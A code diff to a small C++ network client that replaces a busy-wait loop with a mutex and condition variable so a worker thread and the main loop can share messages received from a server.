@@ -1,18 +1,21 @@
-#include <thread>
-
 #include "Client.h"
 
+#include <thread>
+#include <mutex>
+#include <condition_variable>
+
 static std::string rcvMsg;
-static std::string stopOptimizeThisWhileLoop;
+static std::condition_variable cv;
+static std::mutex mutex;
 
 void waitingForServerMsg(Client& zombie)
 {
 	while (true)
 	{
+		std::unique_lock<std::mutex> ul(mutex);
 		if (zombie.receiveFromServer())
 			rcvMsg = zombie.getSrvMsg();
-		while (!rcvMsg.empty())
-			stopOptimizeThisWhileLoop = "Hope it wont get optimized";
+		cv.wait(ul, []() {return rcvMsg.empty(); });
 	}
 }
 
@@ -35,8 +38,10 @@ int main()
 		{
 			std::cout << "connected" << std::endl;
 			std::thread worker(waitingForServerMsg, std::ref(Zombie));
+			worker.detach();
 			while (true)
 			{
+				std::lock_guard guard1(mutex);
 				if (!rcvMsg.empty())
 				{
 					std::cout << rcvMsg << std::endl;
@@ -45,9 +50,9 @@ int main()
 					else
 						Zombie.sendToSrv(rcvMsg.c_str(), rcvMsg.size());
 					rcvMsg.clear();
+					cv.notify_one();
 				}
 			}
-			worker.detach();
 		}
 		else
 		{
